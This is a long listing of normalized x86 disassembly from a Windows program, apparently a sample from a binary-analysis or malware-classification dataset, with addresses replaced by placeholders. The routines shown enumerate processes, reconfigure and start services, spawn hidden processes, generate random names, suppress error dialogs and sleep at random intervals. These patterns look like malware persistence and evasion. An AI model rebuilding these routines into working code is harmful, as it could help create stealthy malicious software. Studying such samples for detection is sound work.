test eax eax
je r-xdata
push 0x0
push ebx
call sub_40d7b3
mov [ ebp + 0x1c ] eax
cmp eax 0xffffffff
je r-xdata
mov esi [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x20 ] 0x7d3996f2
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x1b ] edi
call sub_40cb2c
lea eax [ ebp - 0x20 ]
push eax
push 0xd
pop edi
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x17 ] esi
call sub_40cb2c
and [ ebp + 0x18 ] 0x0
push 0xa
call edi
push 0x0
call edi
test ebx ebx
jne r-xdata
push ebx
lea eax [ ebp + 0x14 ]
push eax
push 0x120f8
lea eax [ ebp - 0x12164 ]
push eax
push [ ebp + 0x1c ]
call [ ReadFile@IAT ]
mov ebx eax
neg ebx
sbb ebx ebx
and ebx [ ebp + 0x14 ]
push [ ebp - 0x28 ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0x18 ]
lea eax [ ebp - 0x12164 ]
push 0x28
push [ ebp - 0x24 ]
push 0x0
push [ ebp + 0xc ]
push ebx
push eax
call sub_40ffc9
test al al
je r-xdata
push [ ebp + 0x1c ]
call [ CloseHandle@IAT ]
mov bl 0x1
jmp r-xdata
push 0x927c0
call edi
push 0xa
call edi
push 0x0
call edi
add [ ebp + 0x18 ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x60 ]
call sub_40c938
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x50 ]
push eax
call sub_4125f1
mov al bl
jmp r-xdata
xor ebx ebx
lea eax [ ebp - 0x12164 ]
mov [ ebp + 0x14 ] ebx
test eax eax
je r-xdata
sub_40e1b3
push ebp
mov ebp esp
sub esp 0x22c
push edi
push 0x0
push 0x2
mov [ ebp - 0x22c ] 0x22c
call [ CreateToolhelp32Snapshot@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x22c ]
push eax
push edi
call [ Process32FirstW@IAT ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
push edi
call [ CloseHandle@IAT ]
mov al 0x1
push [ ebp + 0xc ]
lea eax [ ebp - 0x22c ]
push eax
call [ ebp + 0x8 ]
pop ecx
pop ecx
cmp al 0x1
jne r-xdata
pop edi
leave
retn 0x8
push esi
mov esi [ Process32NextW@IAT ]
jmp r-xdata
lea eax [ ebp - 0x22c ]
push eax
push edi
call esi
test eax eax
jne r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x22c ]
push eax
call [ ebp + 0x8 ]
pop ecx
pop ecx
test al al
je r-xdata
pop esi
sub_40e23a
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
xor ecx ecx
mov eax r--data
cmp ecx eax
je r-xdata
mov al 0x1
leave
retn
push 0x4
lea ecx [ ebp - 0x4 ]
push ecx
push 0x4
push r--data
push eax
push 0x80000001
call sub_40c46e
sub_40e269
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor al al
mov eax [ esi + 0x4e7c ]
test eax eax
js r-xdata
cmp eax 0x20
jge r-xdata
imul eax eax 0x118
push 0x118
push [ esp + 0x8 ]
lea eax [ eax + esi + 0x2b7c ]
push eax
call sub_401f50
add esp 0xc
inc [ esi + 0x4e7c ]
mov al 0x1
jmp r-xdata
retn 0x4
sub_40e2ad
mov edx [ esp + 0x4 ]
test edx edx
je r-xdata
xor al al
mov eax [ esi + 0x2b78 ]
test eax eax
js r-xdata
cmp eax 0x20
jge r-xdata
push ebx
xor ecx ecx
push edi
mov edi 0x118
test eax eax
jle r-xdata
imul eax eax 0x118
push edi
push [ esp + 0x10 ]
lea eax [ eax + esi + 0x878 ]
push eax
call sub_401f50
add esp 0xc
mov ebx [ edx + 0x8 ]
lea edx [ esi + 0x880 ]
retn 0x4
push 0x1f
pop edx
mov eax ecx
imul eax eax 0x118
sub edx ecx
imul edx edx 0x118
add eax esi
lea ebx [ eax + 0x878 ]
push edx
add eax 0x990
push ebx
push eax
call sub_401f50
push edi
push [ esp + 0x1c ]
push ebx
call sub_401f50
add esp 0x18
jmp r-xdata
inc ecx
add edx edi
cmp ecx eax
jl r-xdata
inc [ esi + 0x2b78 ]
pop edi
mov al 0x1
pop ebx
jmp r-xdata
cmp ebx [ edx ]
jg r-xdata
sub_40e355
test ebx ebx
je r-xdata
xor al al
retn
mov eax [ esi + 0x504 ]
test eax eax
js r-xdata
cmp eax 0x20
jge r-xdata
xor ecx ecx
push edi
test eax eax
jle r-xdata
imul eax eax 0x14
push 0x14
lea eax [ eax + esi + 0x284 ]
push ebx
push eax
call sub_401f50
add esp 0xc
mov edi [ ebx + 0x8 ]
lea edx [ esi + 0x28c ]
push 0x1f
pop edx
mov eax ecx
imul eax eax 0x14
sub edx ecx
imul edx edx 0x14
add eax esi
lea edi [ eax + 0x284 ]
push edx
add eax 0x298
push edi
push eax
call sub_401f50
push 0x14
push ebx
push edi
call sub_401f50
add esp 0x18
jmp r-xdata
inc ecx
add edx 0x14
cmp ecx eax
jl r-xdata
inc [ esi + 0x504 ]
mov al 0x1
pop edi
retn
cmp edi [ edx ]
jg r-xdata
sub_40e3d7
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push edi
test ebx ebx
je r-xdata
xor al al
mov eax [ esi + 0x78c ]
test eax eax
js r-xdata
cmp eax 0x20
jge r-xdata
xor ecx ecx
test eax eax
jle r-xdata
imul eax eax 0x14
push 0x14
lea eax [ eax + esi + 0x50c ]
push ebx
push eax
call sub_401f50
add esp 0xc
mov edi [ ebx + 0x8 ]
lea edx [ esi + 0x514 ]
fild [ esp + 0x4 ]
fdivr [ r--data ]
fld st0
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
lea eax [ esi + 0x514 ]
mov edi ecx
push 0x1f
pop edx
mov eax ecx
imul eax eax 0x14
sub edx ecx
imul edx edx 0x14
add eax esi
lea edi [ eax + 0x50c ]
push edx
add eax 0x520
push edi
push eax
call sub_401f50
push 0x14
push ebx
push edi
call sub_401f50
add esp 0x18
jmp r-xdata
inc ecx
add edx 0x14
cmp ecx eax
jl r-xdata
xor edi edi
xor edx edx
test ecx ecx
jle r-xdata
fstp st1
fld1
fxch st1
add edx [ eax ]
add eax 0x14
dec edi
jne r-xdata
mov [ esp + 0x4 ] edx
inc [ esi + 0x78c ]
mov ecx [ esi + 0x78c ]
xor edx edx
mov [ esp + 0x4 ] edx
test ecx ecx
jle r-xdata
cmp edi [ edx ]
jge r-xdata
fstp st0
mov al 0x1
fstp st0
jmp r-xdata
lea ecx [ esi + 0x514 ]
pop edi
mov esp ebp
pop ebp
retn
fnstsw ax
test ah 0x41
je r-xdata
mov [ esi + edi + 0x790 ] dl
inc edi
cmp edi 0x64
jge r-xdata
cmp edi 0x64
jge r-xdata
inc [ esp + 0x4 ]
fild [ esp + 0x4 ]
fild [ ecx ]
fmul st3
fcompp
inc edx
add ecx 0x14
cmp edx [ esi + 0x78c ]
jl r-xdata
fild [ ecx ]
and [ esp + 0x4 ] 0x0
fmul st2
fcomp st1
jmp r-xdata
sub_40e50e
test ebx ebx
je r-xdata
xor al al
retn
mov eax [ esi + 0x280 ]
test eax eax
js r-xdata
cmp eax 0x20
jge r-xdata
xor ecx ecx
push edi
test eax eax
jle r-xdata
imul eax eax 0x14
push 0x14
add eax esi
push ebx
push eax
call sub_401f50
add esp 0xc
mov edi [ ebx + 0x8 ]
lea edx [ esi + 0x8 ]
push 0x1f
pop eax
sub eax ecx
mov edi ecx
imul eax eax 0x14
imul edi edi 0x14
push eax
add edi esi
lea eax [ edi + 0x14 ]
push edi
push eax
call sub_401f50
push 0x14
push ebx
push edi
call sub_401f50
add esp 0x18
jmp r-xdata
inc ecx
add edx 0x14
cmp ecx eax
jl r-xdata
inc [ esi + 0x280 ]
mov al 0x1
pop edi
retn
cmp edi [ edx ]
jge r-xdata
sub_40e580
push esi
mov esi [ CryptAcquireContextW@IAT ]
push edi
push 0xf0000040
push 0x1
push r--data
push 0x0
mov edi rw-data
push edi
call esi
test eax eax
jne r-xdata
mov eax [ rw-data ]
pop edi
pop esi
retn
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
push 0x8
push 0x1
push 0x0
push r--data
push edi
call esi
sub_40e5c5
mov edx [ rw-data ]
push edi
mov edi [ rw-data ]
mov eax edx
or eax edi
jne r-xdata
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
push 0x0
sub eax edx
push 0x989680
sbb ecx edi
push ecx
push eax
call sub_416640
pop edi
retn
push esi
push r--data
call [ SystemTimeToFileTime@IAT ]
mov edx [ esi ]
mov [ rw-data ] edx
mov edi [ esi + 0x4 ]
mov [ rw-data ] edi
sub_40e60e
push esi
push edi
mov edi [ esp + 0xc ]
xor esi esi
add edi 0x24
mov ecx [ esi * 8 + rw-data ]
mov eax [ esp + 0x10 ]
or [ eax ] ecx
inc esi
cmp esi 0x13
jl r-xdata
push edi
push [ esi * 8 + rw-data ]
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
jmp r-xdata
pop edi
mov al 0x1
pop esi
retn
sub_40e67d
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] 0x1
sete al
leave
retn
lea eax [ ebp - 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ rw-data ]
sub_40e6b8
push ebx
push ebp
push 0xf003f
xor ebx ebx
push ebx
push ebx
call [ OpenSCManagerW@IAT ]
mov ebp eax
cmp ebp ebx
jne r-xdata
push esi
push edi
push 0xf01ff
push [ esp + 0x18 ]
push ebp
call [ OpenServiceW@IAT ]
mov edi [ CloseServiceHandle@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
xor al al
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0xffffffff
push 0x2
push 0xffffffff
push esi
call [ ChangeServiceConfigW@IAT ]
push ebx
push ebx
push esi
call [ StartServiceW@IAT ]
test eax eax
jne r-xdata
push ebp
call edi
pop edi
mov al bl
pop esi
jmp r-xdata
mov bl 0x1
call [ GetLastError@IAT ]
cmp eax 0x420
jne r-xdata
pop ebp
pop ebx
retn 0x4
push esi
call edi
jmp r-xdata
sub_40e745
mov eax sub_41a95a
call sub_416a8c
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov ecx esi
call sub_402525
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0xc ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0x10 ] eax
mov eax [ edi ]
mov [ esi + 0x14 ] eax
mov edi [ edi ]
cmp edi 0xc0000005
je r-xdata
mov [ esi + 0xc ] r--data
cmp edi 0xc000008e
je r-xdata
mov [ esi + 0xc ] r--data
jmp r-xdata
cmp edi 0xc0000094
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_40e7b9
test edi edi
jne r-xdata
push esi
push edi
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
call sub_412da8
mov esi eax
test esi esi
je r-xdata
xor eax eax
retn
mov eax esi
pop esi
retn
push edi
push esi
call [ lstrcpyW@IAT ]
sub_40e7e3
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
push [ ebp + 0x8 ]
call esi
push [ ebp + 0xc ]
mov edi eax
mov [ ebp - 0x10 ] edi
call esi
mov ebx eax
lea ecx [ ebx + 0x1 ]
lea eax [ edi + 0x1 ]
imul eax ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x1 ] 0x0
call sub_412da8
mov [ ebp - 0x14 ] eax
test eax eax
jne r-xdata
mov ecx ebx
imul ecx edi
mov edx eax
test ecx ecx
je r-xdata
xor al al
jmp r-xdata
and [ ebp - 0x8 ] 0x0
test edi edi
je r-xdata
mov [ edx ] 0x0
inc edx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
xor edx edx
test edi edi
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi eax
sub esi ebx
mov [ ebp + 0x8 ] ecx
dec esi
push eax
call sub_412d05
mov al [ ebp - 0x1 ]
lea ecx [ eax + ebx - 0x1 ]
test [ ebp - 0x8 ] 0x1f
jne r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + edi * 2 ]
push eax
call sub_402512
mov bx ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
push eax
call sub_402512
pop ecx
pop ecx
cmp ax bx
je r-xdata
mov [ ebp - 0x1 ] 0x1
inc edx
add ecx ebx
cmp edx edi
jb r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
add [ ebp + 0x8 ] 0x2
add esi ebx
cmp eax [ ebp - 0x10 ]
jb r-xdata
mov edi [ Sleep@IAT ]
push 0xa
call edi
push 0x0
call edi
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + edi * 2 ]
cmp eax 0x3f
je r-xdata
movzx esi [ ecx ]
cmp esi ebx
je r-xdata
jmp r-xdata
xor edi edi
test ebx ebx
je r-xdata
mov eax [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
xor eax eax
inc eax
jmp r-xdata
cmp eax 0x2a
jne r-xdata
inc edi
cmp edi ebx
jb r-xdata
test edi edi
je r-xdata
mov ebx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
movzx eax [ esi + edi ]
inc eax
jmp r-xdata
xor eax eax
inc eax
test edi edi
je r-xdata
mov ebx [ ebp - 0xc ]
lea ecx [ esi + ebx + 0x1 ]
mov [ ecx + edi ] al
jmp r-xdata
xor ecx ecx
inc ecx
movzx ecx [ esi + edi + 0x1 ]
jmp r-xdata
movzx eax [ esi + edi ]
inc eax
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp eax ecx
jle r-xdata
test edx edx
je r-xdata
movzx eax [ esi + edi + 0x1 ]
jmp r-xdata
sub_40e94e
push ebp
mov ebp esp
sub esp 0x30
push edi
push 0x8
xor eax eax
pop ecx
lea edi [ ebp - 0x30 ]
[ edi ]
mov eax [ rw-data ]
pop edi
test eax eax
jne r-xdata
lea ecx [ ebp - 0x30 ]
push ecx
push 0x20
push eax
call [ CryptGenRandom@IAT ]
test eax eax
je r-xdata
call sub_40e580
lea eax [ ebp - 0x10 ]
push eax
call [ GetSystemTime@IAT ]
call [ GetTickCount@IAT ]
movzx ecx [ ebp - 0x2 ]
shl eax 0xd
xor eax ecx
xor eax [ rw-data ]
imul eax eax 0x19660d
add eax 0x3c6ef35f
mov eax [ ebp - 0x30 ]
jmp r-xdata
xor edx edx
div [ ebp + 0x8 ]
mov [ rw-data ] edx
mov eax edx
leave
retn 0x4
sub_40e9bf
push ebp
mov ebp esp
sub esp 0x1c
push esi
lea eax [ ebp - 0x18 ]
push eax
call [ GetLocalTime@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ SystemTimeToFileTime@IAT ]
lea esi [ ebp - 0x8 ]
call sub_40e5c5
pop esi
leave
retn
sub_40ea0e
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push 0x44
pop ecx
mov edx ecx
lea eax [ ebp - 0x58 ]
xor ebx ebx
mov [ eax ] bl
inc eax
dec edx
jne r-xdata
push 0x10
pop edx
lea eax [ ebp - 0x10 ]
mov [ eax ] bl
inc eax
dec edx
jne r-xdata
xor eax eax
mov [ ebp - 0x28 ] ax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
push ebx
push ebx
push 0x8000000
push ebx
push ebx
push ebx
push [ ebp + 0xc ]
mov [ ebp - 0x58 ] ecx
push [ ebp + 0x8 ]
mov [ ebp - 0x2c ] 0x81
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
xor al al
cmp esi ebx
je r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ esi ] eax
pop ebx
leave
retn 0x8
sub_40ea77
mov eax sub_41a98a
call sub_416a8c
push ecx
push ebx
mov [ ebp - 0x10 ] rw-data
and [ ebp - 0x4 ] 0x0
push rw-data
call sub_40cdfa
push rw-data
call sub_40cdfa
push rw-data
call sub_40cdfa
push [ rw-data ]
call [ CloseHandle@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov ebx rw-data
call sub_4010c9
mov ecx [ ebp - 0xc ]
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
sub_40ead3
mov eax sub_41a99c
call sub_416a8c
push esi
mov esi [ ebp + 0x8 ]
push esi
mov ecx edi
call sub_40e745
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi + 0x18 ] al
mov [ esi + 0x1c ] eax
mov [ esi ] r--data
cmp [ edi + 0x14 ] 0x1
sete al
mov [ esi + 0x18 ] al
mov eax [ edi + 0x18 ]
mov [ esi + 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_40eb1f
push ebp
mov ebp esp
sub esp 0x38
cmp [ ebp + 0x8 ] 0xc0000005
push edi
je r-xdata
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp + 0xc ]
mov edi [ eax ]
call sub_40ead3
push r--data
lea eax [ ebp - 0x38 ]
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
call sub_40e745
push r--data
lea eax [ ebp - 0x18 ]
push eax
call sub_4042ef
sub_40eb6f
mov eax sub_41a9ba
call sub_416a8c
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_40eb63
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
mov ecx [ ecx + 0x4 ]
imul ecx ecx 0x14
push eax
call [ ecx + eax + 0x50c ]
pop ecx
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_40ebc4
mov eax sub_41a9c4
call sub_416a8c
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_40eb63
mov edi [ ebp + 0x8 ]
mov esi [ edi ]
mov [ ebp - 0x18 ] esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push 0xffffffff
call [ GetCurrentThread@IAT ]
push eax
call [ SetThreadPriority@IAT ]
mov eax [ edi + 0x4 ]
imul eax eax 0x118
cmp [ eax + esi + 0x98c ] bl
je r-xdata
mov [ ebp - 0x4 ] ebx
mov eax [ edi + 0x4 ]
imul eax eax 0x118
push esi
call [ eax + esi + 0x878 ]
pop ecx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
call sub_40e661
mov eax [ edi + 0x4 ]
imul eax eax 0x118
cmp [ eax + esi + 0x98c ] 0x0
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x14 ]
push eax
call sub_40e645
sub_40ec3e
mov edi [ ebp + 0x8 ]
mov esi [ ebp - 0x18 ]
mov eax [ edi + 0x4 ]
imul eax eax 0x118
cmp [ eax + esi + 0x98c ] 0x0
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x14 ]
push eax
call sub_40e645
sub_40ec73
mov eax sub_41a9ce
call sub_416a8c
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_40eb63
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push 0xffffffff
call [ GetCurrentThread@IAT ]
push eax
call [ SetThreadPriority@IAT ]
mov esi [ ebp + 0x8 ]
cmp [ esi + 0xc ] bl
je r-xdata
mov [ ebp - 0x4 ] ebx
push [ esi + 0x4 ]
call [ esi ]
pop ecx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
call sub_40e661
cmp [ esi + 0xc ] 0x0
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x14 ]
push eax
call sub_40e645
sub_40ecd0
mov esi [ ebp + 0x8 ]
cmp [ esi + 0xc ] 0x0
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x14 ]
push eax
call sub_40e645
sub_40ecf5
push esi
push 0x3
mov esi eax
xor edx edx
pop ecx
div ecx
xor edx edx
sub esi eax
lea eax [ esi + esi + 0x2 ]
div ecx
push eax
call sub_40e94e
add esi eax
imul esi esi 0x3e8
push 0x0
push esi
call [ SleepEx@IAT ]
pop esi
retn
sub_40ed22
mov eax sub_41a9e6
call sub_416a8c
test [ rw-data ] 0x1
jne r-xdata
inc [ rw-data ]
mov ecx [ ebp - 0xc ]
mov eax [ rw-data ]
mov [ fs : 0x0 ] ecx
leave
retn
or [ rw-data ] 0x1
and [ ebp - 0x4 ] 0x0
push 0xffffffff
call sub_40e94e
mov [ rw-data ] eax
or [ ebp - 0x4 ] 0xffffffff
sub_40ed67
push ebp
mov ebp [ esp + 0x8 ]
push esi
push 0x29
call sub_40e94e
mov esi eax
test ebp ebp
jne r-xdata
imul eax eax 0xc
push ebx
push edi
mov edi rw-data
add eax edi
push eax
push ebp
call [ lstrcpyW@IAT ]
jmp r-xdata
xor al al
jmp r-xdata
dec [ esp + 0x18 ]
mov ebx esi
jne r-xdata
pop esi
pop ebp
retn 0x8
push 0x29
call sub_40e94e
mov esi eax
cmp esi ebx
jne r-xdata
pop edi
mov al 0x1
pop ebx
mov eax esi
imul eax eax 0xc
add eax edi
push eax
push ebp
call [ lstrcatW@IAT ]
inc esi
cmp esi 0x29
jl r-xdata
xor esi esi
sub_40edc9
push edi
push 0x20
call sub_40e94e
xor edi edi
test esi esi
jne r-xdata
mov ax [ eax * 2 + rw-data ]
mov [ esi ] ax
jmp r-xdata
xor al al
jmp r-xdata
dec [ esp + 0x8 ]
jne r-xdata
pop edi
retn 0x4
push 0x20
call sub_40e94e
mov ax [ eax * 2 + rw-data ]
inc edi
mov [ esi + edi * 2 ] ax
xor eax eax
mov [ esi + edi * 2 ] ax
mov al 0x1
sub_40ee0e
push ebp
mov ebp esp
sub esp 0x644
push ebx
push esi
push edi
push 0x1
push 0x208
lea eax [ ebp - 0x438 ]
push eax
call sub_41021b
test al al
je r-xdata
xor al al
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x438 ]
push eax
call esi
lea eax [ ebp - 0x438 ]
test eax eax
jne r-xdata
push 0x2
lea eax [ ebp - 0x438 ]
push eax
call sub_40d7b3
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ebx [ lstrlenA@IAT ]
mov edi rw-data
push edi
call ebx
xor ecx ecx
cmp ecx edi
je r-xdata
push 0x14
lea eax [ ebp - 0x24 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x24 ]
push eax
call ebx
lea ecx [ ebp - 0x24 ]
test ecx ecx
je r-xdata
push eax
push edi
push [ ebp - 0x4 ]
call sub_40d6ff
mov edi rw-data
push edi
call ebx
xor ecx ecx
cmp ecx edi
je r-xdata
push eax
mov eax ecx
push eax
push [ ebp - 0x4 ]
call sub_40d6ff
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
mov edi 0x104
push edi
lea eax [ ebp - 0x640 ]
push eax
call [ GetWindowsDirectoryW@IAT ]
mov ebx [ lstrcpyW@IAT ]
test eax eax
je r-xdata
push eax
push edi
push [ ebp - 0x4 ]
call sub_40d6ff
push r--data
lea eax [ ebp - 0x640 ]
push eax
call ebx
cmp eax edi
jae r-xdata
push 0xa
call [ Sleep@IAT ]
mov al 0x1
jmp r-xdata
push r--data
lea eax [ ebp - 0x640 ]
push eax
call esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push r--data
lea eax [ ebp - 0x230 ]
push eax
call ebx
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x230 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x230 ]
push eax
call esi
mov edi r--data
push edi
lea eax [ ebp - 0x230 ]
push eax
call esi
call sub_4102c5
push eax
lea eax [ ebp - 0x230 ]
push eax
call esi
push edi
lea eax [ ebp - 0x230 ]
push eax
call esi
lea eax [ ebp - 0x230 ]
push eax
lea eax [ ebp - 0x640 ]
push eax
lea esi [ ebp - 0x4 ]
call sub_40ea0e
test al al
je r-xdata
sub_40ef9e
push ebp
mov ebp esp
sub esp 0x20c
push esi
push edi
xor edi edi
cmp ebx edi
je r-xdata
pop edi
xor al al
pop esi
leave
retn 0x4
cmp [ ebp + 0x8 ] edi
je r-xdata
push [ ebx ]
call sub_40d843
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x20c ] ax
cmp [ ebp + 0x8 ] edi
jle r-xdata
lea eax [ ebp - 0x20c ]
push eax
push 0x0
xor esi esi
call sub_40ea0e
test al al
je r-xdata
mov esi [ lstrcatW@IAT ]
push 0x7fffffff
call sub_40e94e
push eax
lea eax [ ebp - 0x20c ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x20c ]
push eax
call sub_4102c5
push eax
call sub_40ea0e
test al al
je r-xdata
push [ ebx + edi * 4 ]
lea eax [ ebp - 0x20c ]
push eax
call esi
push r--data
lea eax [ ebp - 0x20c ]
push eax
call esi
inc edi
cmp edi [ ebp + 0x8 ]
jl r-xdata
push esi
call [ ExitProcess@IAT ]
sub_40f066
push esi
push 0x0
call sub_4102c5
push eax
xor esi esi
call sub_40ea0e
pop esi
test al al
je r-xdata
xor al al
retn
push 0x0
call [ ExitProcess@IAT ]
sub_40f086
mov eax sub_41a9fe
call sub_416a8c
push ecx
push ebx
push ebp
push esi
push edi
push 0x1f
mov [ esp + 0x14 ] rw-data
mov edi rw-data
pop ebx
mov esi 0x118
mov ecx edi
call sub_4010f7
add edi esi
dec ebx
jns r-xdata
push 0x1f
mov edi rw-data
pop ebx
mov ecx edi
call sub_4010f7
add edi esi
dec ebx
jns r-xdata
xor ebx ebx
mov esi rw-data
mov [ rw-data ] ebx
mov ecx 0x880
mov eax esi
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
mov eax r--data
push eax
push eax
call [ GetModuleHandleW@IAT ]
mov edi eax
call sub_40105e
mov ebp r--data
push ebp
push ebp
call [ GetModuleHandleW@IAT ]
mov edi eax
call sub_40105e
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ esp + 0x1c ] ebx
call [ FreeConsole@IAT ]
push 0x8007
call [ SetErrorMode@IAT ]
push sub_40e740
call [ SetUnhandledExceptionFilter@IAT ]
call sub_40eb63
or esi 0xffffffff
push esi
call [ GetCurrentThread@IAT ]
push eax
call [ SetThreadPriority@IAT ]
push 0x64
mov [ rw-data ] bl
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
pop ecx
mov eax rw-data
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] 0x1
mov [ rw-data ] esi
mov [ rw-data ] bl
call sub_40e9bf
mov [ rw-data ] eax
call sub_40e9bf
push 0x8
mov [ rw-data ] eax
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
pop ecx
mov eax rw-data
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
mov ecx 0x120
mov eax rw-data
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
push rw-data
call sub_40ce4a
push rw-data
call sub_40ce4a
push rw-data
mov [ rw-data ] esi
call sub_40ce4a
push r--data
call sub_40f29b
mov ebx r--data
mov ecx eax
call sub_412df3
push r--data
mov [ rw-data ] eax
call sub_40f29b
mov ebx ebp
mov ecx eax
call sub_412df3
push r--data
mov [ rw-data ] eax
call sub_40f29b
mov ecx eax
call sub_412df3
push r--data
mov [ rw-data ] eax
call sub_40f29b
mov ebx r--data
mov ecx eax
call sub_412df3
push r--data
mov [ rw-data ] eax
call sub_40f29b
mov ebx ebp
mov ecx eax
call sub_412df3
mov [ rw-data ] eax
mov [ esp + 0x1c ] esi
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
mov eax rw-data
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
sub_40f29b
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41aa25
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
test [ rw-data ] 0x1
jne r-xdata
mov ecx [ esp + 0x4 ]
mov eax rw-data
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
or [ rw-data ] 0x1
and [ esp + 0xc ] 0x0
call sub_40f086
push j_sub_40ea77
call sub_4023d4
pop ecx
or [ esp + 0xc ] 0xffffffff
sub_40f2f5
push ecx
push ecx
mov eax [ edi + 0x78c ]
test eax eax
jg r-xdata
